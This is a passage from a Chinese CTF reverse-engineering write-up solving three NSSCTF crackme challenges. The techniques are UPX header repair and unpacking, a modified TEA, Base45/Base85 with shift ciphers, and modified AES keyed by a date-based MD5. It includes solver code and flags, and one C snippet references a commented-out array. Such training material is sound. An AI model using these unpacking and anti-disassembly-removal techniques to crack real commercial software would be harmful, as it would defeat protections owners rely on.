0;&#125;NSSCTF&#123;Wh@t_@_b1g_F1sh&#125;\n\nLockedSecret换头UPX,手动修头，UPX!前面是版本，这里找了个UPX头的模板随便填的。upx脱壳就行。\n\n加密逻辑就在_main里，第一个函数是用于异或处理密钥的，第二个是一个tea加密。\n\n不知道为什么IDA给我识别成这鸟样，用Ghidra和BN分析会更好，但是解题的时候没想到。写出加密逻辑后动调看了好久发现数据对不上后面看一下汇编才发现v12和v5那些那里的那一长串是假的，其实就只有类似v1 +&#x3D; ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);的操作，其实就是普通的tea加密逻辑。所以这里的轮数只有八轮。密钥的话直接动调获取k的值就行，delta就是开始的值1579382783，最后还异或了一个0xf。不用管之前的那些操作。密文也同理动调获取就行，4字节分组两两解密。\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void encrypt(uint32_t* v, uint32_t* k) &#123; //加密逻辑    uint32_t v0 = v[0], v1 = v[1],  i;    int delta = 0x5E2377FF,sum = 0;    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];    for (i = 0; i &lt; 8; i++) &#123;        sum += delta;        //printf(&quot;sum: %d  ,%d\\n&quot;, sum,i);        /*if (i == 2) &#123;  //假的            uint32_t a, b, c;            a = (k3 + ((v0 + ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1)) &gt;&gt; 5));            b = (v0 + ((v1 + ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1) + sum)));            c = (k2 + ((v0 + ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1)) &lt;&lt; 4));            v1 += a ^ b ^ c;            v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);        &#125;*/        v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);        v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);        //printf(&quot;%8x  %8x\\n&quot;, v0, v1);    &#125;    v[0] = v0 ^0xf; v[1] = v1^0xf;&#125;void decrypt(uint32_t* v, uint32_t* k) &#123; //解密逻辑    int und = 8;    uint32_t v0 = v[0] ^0xf, v1 = v[1] ^0xf; //异或解密    int sum = 0x5E2377FF * und, i;      int delta = 0x5E2377FF;    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];    for (i = 0; i &lt; und; i++) &#123;        v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);        v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);        sum -= delta;    &#125;    v[0] = v0; v[1] = v1;&#125;int main() &#123;    uint32_t v[8] = &#123; 0x031E45DC, 0x2776E989, 0x01234847, 0x64CED270, 0x33467FDA, 0xA34903B1, 0x2CD10027, 0x75BDB337 &#125;;    uint32_t k[4] = &#123; 0x423DF72D, 0x05F59A01, 0x633FCF1D, 0x77D19122 &#125;;             //unsigned int data[8] = &#123;    //0x31313131, 0x31313131, 0x31313131, 0x31313131, 0x31313131, 0x31313131, 0x31313131, 0x31313131    //&#125;; //测试数据    for (int i = 0; i &lt; 8; i += 2) &#123;        encrypt(&amp;data[i], k);        //printf(&quot;%8x  %8x\\n&quot;, data[i], data[i + 1]);    &#125;    for (int i = 0; i &lt; 8; i += 2) &#123;        decrypt(&amp;v[i], k);    &#125;        for (int i = 0; i &lt; 32; i++) &#123;        printf(&quot;%c&quot;, *((char*)v + i));    &#125;    return 0;&#125;NSSCTF&#123;!!!Y0u_g3t_th3_s3cr3t!!!&#125;\n\nMio？Ryo？Soyo？解包的时候要用相同的python版本3.8。secret模块在子包里面。用pycdc反编译后让AI给我们重命名一下\nclass Base85Encoder:    CHARSET = &#x27;&#x27;.join(chr(c) for c in range(33, 118))    @staticmethod    def encode(data: bytes) -&gt; str:        encoded_str = &#x27;&#x27;        padding = (4 - len(data) % 4) % 4        data += b&#x27;\\x00&#x27; * padding        for i in range(0, len(data), 4):            chunk = data[i:i + 4]            value = int.from_bytes(chunk, &#x27;big&#x27;)            encoded_chunk = &#x27;&#x27;            for _ in range(5):                encoded_chunk = Base85Encoder.CHARSET[value % 85] + encoded_chunk                value //= 85            encoded_str += encoded_chunk        if padding:            encoded_str = encoded_str[:-padding]        return encoded_strclass Base45Encoder:    CHARSET = &#x27;&#x27;.join(chr(c) for c in range(48, 93)) # 换表    @staticmethod    def encode(data: bytes) -&gt; str:        encoded_list = []        i = 0        while i &lt; len(data):            if i + 1 &lt; len(data):                value = data[i] &lt;&lt; 8 | data[i + 1]                encoded_list.append(Base45Encoder.CHARSET[value % 45])                value //= 45                encoded_list.append(Base45Encoder.CHARSET[value % 45])                value //= 45                encoded_list.append(Base45Encoder.CHARSET[value])                i += 2            else:                value = data[i]                encoded_list.append(Base45Encoder.CHARSET[value % 45])                value //= 45                encoded_list.append(Base45Encoder.CHARSET[value])                i += 1        return &#x27;&#x27;.join(encoded_list)def ShiftCipher(text: str, shift: int) -&gt; str:    result = []    for char in text:        if &#x27;a&#x27; &lt;= char &lt;= &#x27;z&#x27;:            new_char = chr(ord(&#x27;a&#x27;) + (ord(char) - ord(&#x27;a&#x27;) + shift) % 26)            result.append(new_char)        elif &#x27;0&#x27; &lt;= char &lt;= &#x27;9&#x27;:            new_char = chr(ord(&#x27;0&#x27;) + (ord(char) - ord(&#x27;0&#x27;) - shift) % 10)            result.append(new_char)        else:            result.append(char)    return &#x27;&#x27;.join(result)# 可能是加密后的字节数据encrypted_bytes = bytes([    57, 118, 33, 114, 68, 56, 117, 115, 34, 52, 52, 95, 78, 40, 49, 59, 95, 85, 63, 122,    54, 33, 77, 110, 49, 54, 34, 109, 106, 122, 60, 92, 108, 91, 61, 51, 42, 62, 35, 38,    52, 67, 62, 122, 116, 48, 76, 50, 67, 51, 59, 41, 122, 45, 45, 51, 90])def decrypt_data(data: str) -&gt; str:    &quot;&quot;&quot; 解密输入字符串 &quot;&quot;&quot;    step1 = Base45Encoder.encode(data.encode())  # Base45 编码    step2 = ShiftCipher(step1, 7).encode()  # 位移加密    step3 = Base85Encoder.encode(step2)  # Base85 编码    final_result = ShiftCipher(step3, 9)  # 再次位移加密    return final_result\n\n换表base45，base85，和位移加密。直接写出解密就行，不过不知道base解码有点问题一，所以输出用赛博厨师解base。\ndef reshift(text: str, shift: int) -&gt; str:    result = []    for char in text:        if &#x27;a&#x27; &lt;= char &lt;= &#x27;z&#x27;:            new_char = chr(ord(&#x27;a&#x27;) + (ord(char) - ord(&#x27;a&#x27;) - shift) % 26)            result.append(new_char)        elif &#x27;0&#x27; &lt;= char &lt;= &#x27;9&#x27;:            new_char = chr(ord(&#x27;0&#x27;) + (ord(char) - ord(&#x27;0&#x27;) + shift) % 10)            result.append(new_char)        else:            result.append(char)    return &#x27;&#x27;.join(result)a = [    57, 118, 33, 114, 68, 56, 117, 115, 34, 52, 52, 95, 78, 40, 49, 59, 95, 85, 63, 122,    54, 33, 77, 110, 49, 54, 34, 109, 106, 122, 60, 92, 108, 91, 61, 51, 42, 62, 35, 38,    52, 67, 62, 122, 116, 48, 76, 50, 67, 51, 59, 41, 122, 45, 45, 51, 90]m = &quot;&quot;for i in a:    m+=chr(i)re = reshift(m,9)print(re)# 赛博厨师解码base85后导出十六进制data=[0x4a,0x58,0x32,0x4e,0x47,0x3a,0x43,0x4d,0x3a,0x4b,0x4a,0x3f,0x53,0x30,0x3d,0x3a,0x3e,0x3f,0x4e,0x43,0x3e,0x4b,0x35,0x3c,0x56,0x32,0x39,0x5a,0x35,0x3c,0x59,0x3a,0x39,0x43,0x3d,0x3b,0x4c,0x41,0x31,0x52,0x51,0x39,0x47,0x3a,0x37]datastr =&quot;&quot;for i in data:    datastr+=chr(i)decdata = reshift(datastr,7)base45table =&quot;&quot;for i in range(48,94):    base45table += chr(i)print(base45table) #输出base45的表print(decdata) # 8m!iD7lj&quot;33_N(0;_U?q5!Me05&quot;daq&lt;\\c[=2*&gt;#&amp;3C&gt;qk9L1C2;)q--2Z# 0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]# JX9NG:CM:KJ?S7=:&gt;?NC&gt;K2&lt;V96Z2&lt;Y:6C=;LA8RQ6G:4\n\n\n\nTimeSpaceRescue大概逻辑就是获取系统的年月日保存到一个数组中，然后用这些值生成MD5值，把MD5值作为密钥进行魔改AES加密。\nstruct tm&#123;    int tm_sec;  /*秒，正常范围0-59， 但允许至61*/    int tm_min;  /*分钟，0-59*/    int tm_hour; /*小时， 0-23*/    int tm_mday; /*日，即一个月中的第几天，1-31*/    int tm_mon;  /*月， 从一月算起，0-11*/    int tm_year; /*年， 从1900至今已经多少年*/    int tm_wday; /*星期，一周中的第几天， 从星期日算起，0-6*/    int tm_yday; /*从今年1月1日到目前的天数，范围0-365*/    int tm_isdst;/*日光节约时间的旗标*/&#125;;\n\n函数中隐藏了一花指令如下，nop掉就可以发现一些异或。\n.text:00401407                 push    eax.text:00401408                 xor     eax, eax.text:0040140A                 call    $+5.text:0040140F                 add     eax, 5.text:00401412                 add     eax, 6.text:00401415                 add     eax, 7.text:00401418                 shl     eax, 1.text:0040141A                 xor     eax, 2.text:0040141D                 add     eax, 1.text:00401420                 cmp     eax, 71h ; &#x27;q&#x27;.text:00401423                 jz      short loc_401426.text:00401425                 retn.text:00401426 ; ---------------------------------------------------------------------------.text:00401426.text:00401426 loc_401426:                             ; CODE XREF: sub_401210+213↑j.text:00401426                 pop     eax\n\n生成的MD5值会被异或0x11和0x14。\nAES中多加了一些异或。因为在最后a3+&#x3D;16执行了两次，所以a3的索引已经没有指向我们的数据了。直接忽略掉就行，对数据没有影响。xor1和xor2的逻辑直接写出来就行，不需要修改。\n\n解密时把xor1和下面的xor2互换一下就行。题目提示是2024年的一天，直接爆破获得MD5值解密就行。\n#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;typedef unsigned char* POINTER; //指针类型定义typedef struct &#123;    unsigned int state[4];        unsigned int count[2];         unsigned char buffer[64];     &#125; MD5_CTX; //存放MD5算法相关信息的结构体定义void MD5Init(MD5_CTX*);void MD5Update(MD5_CTX*, unsigned char*, unsigned int);void MD5Final(unsigned char[16], MD5_CTX*);void MD5Transform(unsigned int[4], unsigned char[64]);void Encode(unsigned char*, unsigned int*, unsigned int);void Decode(unsigned int*, unsigned char*, unsigned int);void xor1(unsigned char* data);unsigned int xor2(unsigned char* input);//循环左移的位数#define S11 7#define S12 12#define S13 17#define S14 22#define S21 5#define S22 9#define S23 14#define S24 20#define S31 4#define S32 11#define S33 16#define S34 23#define S41 6#define S42 10#define S43 15#define S44 21//数据填充的内容unsigned char PADDING[64] = &#123;  0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0&#125;;//F,G,H,I四个非线性变换函数#define F(x, y, z) (((x) &amp; (y)) | ((~x) &amp; (z)))#define G(x, y, z) (((x) &amp; (z)) | ((y) &amp; (~z)))#define H(x, y, z) ((x) ^ (y) ^ (z))#define I(x, y, z) ((y) ^ ((x) | (~z)))//x循环左移n位的操作#define ROTATE_LEFT(x, n) (((x) &lt;&lt; (n)) | ((x) &gt;&gt; (32-(n))))//FF,GG,HH,II是四轮循环变换分别用到的变换函数#define FF(a, b, c, d, x, s, ac) &#123; \\ (a) += F ((b), (c), (d)) + (x) + (unsigned int)(ac); \\ (a) = ROTATE_LEFT ((a), (s)); \\ (a) += (b); \\  &#125;#define GG(a, b, c, d, x, s, ac) &#123; \\ (a) += G ((b), (c), (d)) + (x) + (unsigned int)(ac); \\ (a) = ROTATE_LEFT ((a), (s)); \\ (a) += (b); \\  &#125;#define HH(a, b, c, d, x, s, ac) &#123; \\ (a) += H ((b), (c), (d)) + (x) + (unsigned int)(ac); \\ (a) = ROTATE_LEFT ((a), (s)); \\ (a) += (b); \\  &#125;#define II(a, b, c, d, x, s, ac) &#123; \\ (a) += I ((b), (c), (d)) + (x) + (unsigned int)(ac); \\ (a) = ROTATE_LEFT ((a), (s)); \\ (a) += (b); \\  &#125;/** * S盒 */static const int S[16][16] = &#123; 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 &#125;;/** * 逆S盒 */static const int S2[16][16] = &#123; 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d &#125;;/** * 获取整形数据的低8位的左4个位 */static int getLeft4Bit(int num) &#123;    int left = num &amp; 0x000000f0;    return left &gt;&gt; 4;&#125;/** * 获取整形数据的低8位的右4个位 */static int getRight4Bit(int num) &#123;    return num &amp; 0x0000000f;&#125;/** * 根据索引，从S盒中获得元素 */static int getNumFromSBox(int index) &#123;    int row = getLeft4Bit(index);    int col = getRight4Bit(index);    return S[row][col];&#125;/** * 把一个字符转变成整型 */static int getIntFromChar(char c) &#123;    int result = (int)c;    return result &amp; 0x000000ff;&#125;/** * 把16个字符转变成4X4的数组， * 该矩阵中字节的排列顺序为从上到下， * 从左到右依次排列。 */static void convertToIntArray(char* str, int pa[4][4]) &#123;    int k = 0;    for (int i = 0; i &lt; 4; i++)        for (int j = 0; j &lt; 4; j++) &#123;            pa[j][i] = getIntFromChar(str[k]);            k++;        &#125;&#125;/** * 打印4X4的数组 */static void printArray(int a[4][4]) &#123;    for (int i = 0; i &lt; 4; i++) &#123;        for (int j = 0; j &lt; 4; j++)            printf(&quot;a[%d][%d] = 0x%x &quot;, i, j, a[i][j]);        printf(&quot;\\n&quot;);    &#125;    printf(&quot;\\n&quot;);&#125;/** * 打印字符串的ASSCI， * 以十六进制显示。 */static void printASSCI(char* str, int len) &#123;    for (int i = 0; i &lt; len; i++)        printf(&quot;0x%x &quot;, getIntFromChar(str[i]));    printf(&quot;\\n&quot;);&#125;/** * 把连续的4个字符合并成一个4字节的整型 */static int getWordFromStr(char* str) &#123;    int one = getIntFromChar(str[0]);    one = one &lt;&lt; 24;    int two = getIntFromChar(str[1]);    two = two &lt;&lt; 16;    int three = getIntFromChar(str[2]);    three = three &lt;&lt; 8;    int four = getIntFromChar(str[3]);    return one | two | three | four;&#125;/** * 把一个4字节的数的第一、二、三、四个字节取出， * 入进一个4个元素的整型数组里面。 */static void splitIntToArray(int num, int array[4]) &#123;    int one = num &gt;&gt; 24;    array[0] = one &amp; 0x000000ff;    int two = num &gt;&gt; 16;    array[1] = two &amp; 0x000000ff;    int three = num &gt;&gt; 8;    array[2] = three &amp; 0x000000ff;    array[3] = num &amp; 0x000000ff;&#125;/** * 将数组中的元素循环左移step位 */static void leftLoop4int(int array[4], int step) &#123;    int temp[4];    for (int i = 0; i &lt; 4; i++)        temp[i] = array[i];    int index = step % 4 == 0 ? 0 : step % 4;    for (int i = 0; i &lt; 4; i++) &#123;        array[i] = temp[index];        index++;        index = index % 4;    &#125;&#125;/** * 把数组中的第一、二、三和四元素分别作为 * 4字节整型的第一、二、三和四字节，合并成一个4字节整型 */static int mergeArrayToInt(int array[4]) &#123;    int one = array[0] &lt;&lt; 24;    int two = array[1] &lt;&lt; 16;    int three = array[2] &lt;&lt; 8;    int four = array[3];    return one | two | three | four;&#125;/** * 常量轮值表 */static const int Rcon[10] = &#123; 0x01000000, 0x02000000,    0x04000000, 0x08000000,    0x10000000, 0x20000000,    0x40000000, 0x80000000,    0x1b000000, 0x36000000 &#125;;/** * 密钥扩展中的T函数 */static int T(int num, int round) &#123;    int numArray[4];    splitIntToArray(num, numArray);    leftLoop4int(numArray, 1);//字循环    //字节代换    for (int i = 0; i &lt; 4; i++)        numArray[i] = getNumFromSBox(numArray[i]);    int result = mergeArrayToInt(numArray);    return result ^ Rcon[round];&#125;//密钥对应的扩展数组static int w[44];/** * 扩展密钥，结果是把w[44]中的每个元素初始化 */static void extendKey(char* key) &#123;    for (int i = 0; i &lt; 4; i++)        w[i] = getWordFromStr(key + i * 4);    for (int i = 4, j = 0; i &lt; 44; i++) &#123;        if (i % 4 == 0) &#123;            w[i] = w[i - 4] ^ T(w[i - 1], j);            j++;//下一轮        &#125;        else &#123;            w[i] = w[i - 4] ^ w[i - 1];        &#125;    &#125;&#125;/** * 轮密钥加 */static void addRoundKey(int array[4][4], int round) &#123;    int warray[4];    for (int i = 0; i &lt; 4; i++) &#123;        splitIntToArray(w[round * 4 + i], warray);        for (int j = 0; j &lt; 4; j++) &#123;            array[j][i] = array[j][i] ^ warray[j];        &#125;    &#125;&#125;/** * 字节代换 */static void subBytes(int array[4][4]) &#123;    for (int i = 0; i &lt; 4; i++)        for (int j = 0; j &lt; 4; j++)            array[i][j] = getNumFromSBox(array[i][j]);&#125;/** * 行移位 */static void shiftRows(int array[4][4]) &#123;    int rowTwo[4], rowThree[4], rowFour[4];    //复制状态矩阵的第2,3,4行    for (int i = 0; i &lt; 4; i++) &#123;        rowTwo[i] = array[1][i];        rowThree[i] = array[2][i];        rowFour[i] = array[3][i];    &#125;    //循环左移相应的位数    leftLoop4int(rowTwo, 1);    leftLoop4int(rowThree, 2);    leftLoop4int(rowFour, 3);    //把左移后的行复制回状态矩阵中    for (int i = 0; i &lt; 4; i++) &#123;        array[1][i] = rowTwo[i];        array[2][i] = rowThree[i];        array[3][i] = rowFour[i];    &#125;&#125;/** * 列混合要用到的矩阵 */static const int colM[4][4] = &#123; 2, 3, 1, 1,    1, 2, 3, 1,    1, 1, 2, 3,    3, 1, 1, 2 &#125;;static int GFMul2(int s) &#123;    int result = s &lt;&lt; 1;    int a7 = result &amp; 0x00000100;    if (a7 != 0) &#123;        result = result &amp; 0x000000ff;        result = result ^ 0x1b;    &#125;    return result;&#125;static int GFMul3(int s) &#123;    return GFMul2(s) ^ s;&#125;static int GFMul4(int s) &#123;    return GFMul2(GFMul2(s));&#125;static int GFMul8(int s) &#123;    return GFMul2(GFMul4(s));&#125;static int GFMul9(int s) &#123;    return GFMul8(s) ^ s;&#125;static int GFMul11(int s) &#123;    return GFMul9(s) ^ GFMul2(s);&#125;static int GFMul12(int s) &#123;    return GFMul8(s) ^ GFMul4(s);&#125;static int GFMul13(int s) &#123;    return GFMul12(s) ^ s;&#125;static int GFMul14(int s) &#123;    return GFMul12(s) ^ GFMul2(s);&#125;/** * GF上的二元运算 */static int GFMul(int n, int s) &#123;    int result;    if (n == 1)        result = s;    else if (n == 2)        result = GFMul2(s);    else if (n == 3)        result = GFMul3(s);    else if (n == 0x9)        result = GFMul9(s);    else if (n == 0xb)//11        result = GFMul11(s);    else if (n == 0xd)//13        result = GFMul13(s);    else if (n == 0xe)//14        result = GFMul14(s);    return result;&#125;/** * 列混合 */static void mixColumns(int array[4][4]) &#123;    int tempArray[4][4];    for (int i = 0; i &lt; 4; i++)        for (int j = 0; j &lt; 4; j++)            tempArray[i][j] = array[i][j];    for (int i = 0; i &lt; 4; i++)        for (int j = 0; j &lt; 4; j++) &#123;            array[i][j] = GFMul(colM[i][0], tempArray[0][j]) ^ GFMul(colM[i][1], tempArray[1][j])                ^ GFMul(colM[i][2], tempArray[2][j]) ^ GFMul(colM[i][3], tempArray[3][j]);        &#125;&#125;/** * 把4X4数组转回字符串 */static void convertArrayToStr(int array[4][4], char* str) &#123;    for (int i = 0; i &lt; 4; i++)        for (int j = 0; j &lt; 4; j++)            *str++ = (char)array[j][i];&#125;/** * 检查密钥长度 */static int checkKeyLen(int len) &#123;    if (len == 16)        return 1;    else        return 0;&#125;/** * 参数 p: 明文的字符串数组。 * 参数 plen: 明文的长度。 * 参数 key: 密钥的字符串数组。 */int aes(char* p, int plen, char* key) &#123;    int keylen = strlen(key);    if (plen == 0 || plen % 16 != 0) &#123;        return 0;    &#125;    if (!checkKeyLen(keylen)) &#123;        return 0;    &#125;    xor1((unsigned char*)key);    extendKey(key);//扩展密钥    int pArray[4][4];    for (int k = 0; k &lt; plen; k += 16) &#123;        xor2((unsigned char*)p + k);        convertToIntArray(p + k, pArray);        addRoundKey(pArray, 0);//一开始的轮密钥加        for (int i = 1; i &lt; 10; i++) &#123;//前9轮            subBytes(pArray);//字节代换            shiftRows(pArray);//行移位            mixColumns(pArray);//列混合            addRoundKey(pArray, i);        &#125;        //第10轮        subBytes(pArray);//字节代换        shiftRows(pArray);//行移位        addRoundKey(pArray, 10);        convertArrayToStr(pArray, p + k);        xor1((unsigned char*)p + k);    &#125;&#125;/** * 根据索引从逆S盒中获取值 */static int getNumFromS1Box(int index) &#123;    int row = getLeft4Bit(index);    int col = getRight4Bit(index);    return S2[row][col];&#125;/** * 逆字节变换 */static void deSubBytes(int array[4][4]) &#123;    for (int i = 0; i &lt; 4; i++)        for (int j = 0; j &lt; 4; j++)            array[i][j] = getNumFromS1Box(array[i][j]);&#125;/** * 把4个元素的数组循环右移step位 */static void rightLoop4int(int array[4], int step) &#123;    int temp[4];    for (int i = 0; i &lt; 4; i++)        temp[i] = array[i];    int index = step % 4 == 0 ? 0 : step % 4;    index = 3 - index;    for (int i = 3; i &gt;= 0; i--) &#123;        array[i] = temp[index];        index--;        index = index == -1 ? 3 : index;    &#125;&#125;/** * 逆行移位 */static void deShiftRows(int array[4][4]) &#123;    int rowTwo[4], rowThree[4], rowFour[4];    for (int i = 0; i &lt; 4; i++) &#123;        rowTwo[i] = array[1][i];        rowThree[i] = array[2][i];        rowFour[i] = array[3][i];    &#125;    rightLoop4int(rowTwo, 1);    rightLoop4int(rowThree, 2);    rightLoop4int(rowFour, 3);    for (int i = 0; i &lt; 4; i++) &#123;        array[1][i] = rowTwo[i];        array[2][i] = rowThree[i];        array[3][i] = rowFour[i];    &#125;&#125;/** * 逆列混合用到的矩阵 */static const int deColM[4][4] = &#123; 0xe, 0xb, 0xd, 0x9,    0x9, 0xe, 0xb, 0xd,    0xd, 0x9, 0xe, 0xb,    0xb, 0xd, 0x9, 0xe &#125;;/** * 逆列混合 */static void deMixColumns(int array[4][4]) &#123;    int tempArray[4][4];    for (int i = 0; i &lt; 4; i++)        for (int j = 0; j &lt; 4; j++)            tempArray[i][j] = array[i][j];    for (int i = 0; i &lt; 4; i++)        for (int j = 0; j &lt; 4; j++) &#123;            array[i][j] = GFMul(deColM[i][0], tempArray[0][j]) ^ GFMul(deColM[i][1], tempArray[1][j])                ^ GFMul(deColM[i][2], tempArray[2][j]) ^ GFMul(deColM[i][3], tempArray[3][j]);        &#125;&#125;/** * 把两个4X4数组进行异或 */static void addRoundTowArray(int aArray[4][4], int bArray[4][4]) &#123;    for (int i = 0; i &lt; 4; i++)        for (int j = 0; j &lt; 4; j++)            aArray[i][j] = aArray[i][j] ^ bArray[i][j];&#125;/** * 从4个32位的密钥字中获得4X4数组， * 用于进行逆列混合 */static void getArrayFrom4W(int i, int array[4][4]) &#123;    int index = i * 4;    int colOne[4], colTwo[4], colThree[4], colFour[4];    splitIntToArray(w[index], colOne);    splitIntToArray(w[index + 1], colTwo);    splitIntToArray(w[index + 2], colThree);    splitIntToArray(w[index + 3], colFour);    for (int i = 0; i &lt; 4; i++) &#123;        array[i][0] = colOne[i];        array[i][1] = colTwo[i];        array[i][2] = colThree[i];        array[i][3] = colFour[i];    &#125;&#125;void xor1(unsigned char* data)&#123;    uint8_t temp;    for (unsigned int i = 0; i &lt; 16; i += 2)    &#123;        temp = data[i] ^ 5;        data[i] = data[i + 1] ^ 5;        data[i + 1] = temp;    &#125;&#125;unsigned int xor2(unsigned char* input) &#123;    unsigned int i_1 = 0;    unsigned int i = 15;    char v4;    while (i_1 &lt; i) &#123;        v4 = input[i_1] ^ 0xF;        input[i_1] = input[i] ^ 0xF;        input[i] = v4;        ++i_1;        --i;    &#125;    return i_1;&#125;/** * 参数 c: 密文的字符串数组。 * 参数 clen: 密文的长度。 * 参数 key: 密钥的字符串数组。 */int deAes(char* c, int 